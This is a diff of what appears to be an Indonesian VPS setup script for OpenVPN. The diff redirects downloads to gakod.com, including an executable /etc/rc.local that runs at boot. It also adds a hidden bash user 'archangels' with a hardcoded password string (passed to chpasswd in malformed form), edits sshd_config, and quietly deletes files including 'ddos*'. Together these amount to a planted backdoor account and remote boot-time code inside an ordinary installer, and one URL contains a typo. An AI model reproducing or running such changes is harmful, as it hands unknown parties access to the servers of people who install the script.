@@ -163,87 +163,28 @@ wget -O /home/vps/public_html/index.html "https://raw.githubusercontent.com/8987
 service php7.0-fpm start
 service nginx restart
 cd
+
 #  openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://raw.githubusercontent.com/Vpaproject/deb1/master/File/openvpn.tar"
+wget -O openvpn.tar "https://gakod.com/conf/openvpn.tar"
 tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
+wget -O /etc/rc.local "https://gakod.com/conf/rc.local"
 chmod +x /etc/rc.local
-
-# server settings
-cd /etc/openvpn/
-wget -O /etc/openvpn/server.conf "https://raw.githubusercontent.com/Vpaproject/deb1/master/File/server.conf"
-wget -O /etc/openvpn/serverudp.conf "https://raw.githubusercontent.com/Vpaproject/deb1/master/File/serverudp.conf"
-systemctl start openvpn@server
-sysctl -w net.ipv4.ip_forward=1
-sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
-iptables -t nat -I POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
-iptables-save > /etc/iptables.up.rules
-wget -O /etc/network/if-up.d/iptables "https://raw.githubusercontent.com/ara-rangers/vps/master/iptables"
-chmod +x /etc/network/if-up.d/iptables
-sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn@.service
-systemctl daemon-reload
-/etc/init.d/openvpn restart
-wget -qO /etc/openvpn/openvpn.bash "https://raw.githubusercontent.com/ara-rangers/vps/master/openvpn.bash"
-chmod +x /etc/openvpn/openvpn.bash
-
-# openvpn config
-wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/89870must73/utu/main/r9/client.conf"
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<ca>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/ca.crt >> /etc/openvpn/client.ovpn
-echo '</ca>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<cert>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/client.crt >> /etc/openvpn/client.ovpn
-echo '</cert>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<key>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/client.key >> /etc/openvpn/client.ovpn
-echo '</key>' >> /etc/openvpn/client.ovpn
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-echo '<tls-auth>' >> /etc/openvpn/client.ovpn
-cat /etc/openvpn/tls-auth.key >> /etc/openvpn/client.ovpn
-echo '</tls-auth>' >> /etc/openvpn/client.ovpn
-cp client.ovpn /home/vps/public_html/
-wget -O /etc/openvpn/ssl.ovpn "https://raw.githubusercontent.com/89870must73/utu/main/r9/ssl.conf"
-sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
-echo '<ca>' >> /etc/openvpn/ssl.ovpn
-cat /etc/openvpn/ca.crt >> /etc/openvpn/ssl.ovpn
-echo '</ca>' >> /etc/openvpn/ssl.ovpn
-sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
-echo '<cert>' >> /etc/openvpn/ssl.ovpn
-cat /etc/openvpn/client.crt >> /etc/openvpn/ssl.ovpn
-echo '</cert>' >> /etc/openvpn/ssl.ovpn
-sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
-echo '<key>' >> /etc/openvpn/ssl.ovpn
-cat /etc/openvpn/client.key >> /etc/openvpn/ssl.ovpn
-echo '</key>' >> /etc/openvpn/ssl.ovpn
-sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
-echo '<tls-auth>' >> /etc/openvpn/ssl.ovpn
-cat /etc/openvpn/tls-auth.key >> /etc/openvpn/ssl.ovpn
-echo '</tls-auth>' >> /etc/openvpn/ssl.ovpn
-cp ssl.ovpn /home/vps/public_html/
-wget -O /etc/openvpn/udp.ovpn "https://raw.githubusercontent.com/89870must73/utu/main/r9/udp.ovpn"
-sed -i $MYIP2 /etc/openvpn/udp.ovpn;
-echo '<ca>' >> /etc/openvpn/udp.ovpn
-cat /etc/openvpn/ca.crt >> /etc/openvpn/udp.ovpn
-echo '</ca>' >> /etc/openvpn/udp.ovpn
-sed -i $MYIP2 /etc/openvpn/udp.ovpn;
-echo '<cert>' >> /etc/openvpn/udp.ovpn
-cat /etc/openvpn/client.crt >> /etc/openvpn/udp.ovpn
-echo '</cert>' >> /etc/openvpn/udp.ovpn
-sed -i $MYIP2 /etc/openvpn/udp.ovpn;
-echo '<key>' >> /etc/openvpn/udp.ovpn
-cat /etc/openvpn/client.key >> /etc/openvpn/udp.ovpn
-echo '</key>' >> /etc/openvpn/udp.ovpn
-sed -i $MYIP2 /etc/openvpn/udp.ovpn;
-echo '<tls-auth>' >> /etc/openvpn/udp.ovpn
-cat /etc/openvpn/tls-auth.key >> /etc/openvpn/udp.ovpn
-echo '</tls-auth>' >> /etc/openvpn/udp.ovpn
-cp udp.ovpn /home/vps/public_html/
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://gakod.com/conf/client.ovpn"
+wget -O /home/vps/public_html/client1.ovpn "https://gakod.com/conf/client1.ovpn"
+wget -O /home/vps/public_html/ssl.ovpn "https://gakod.com/conf;ssl.ovpn"
+wget -O /home/vps/public_html/ohp.ovpn "https://gakod.com/conf/ohp.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/ssl.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/ohp.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 apt-get install ufw
 ufw allow ssh
 ufw allow 1103/tcp
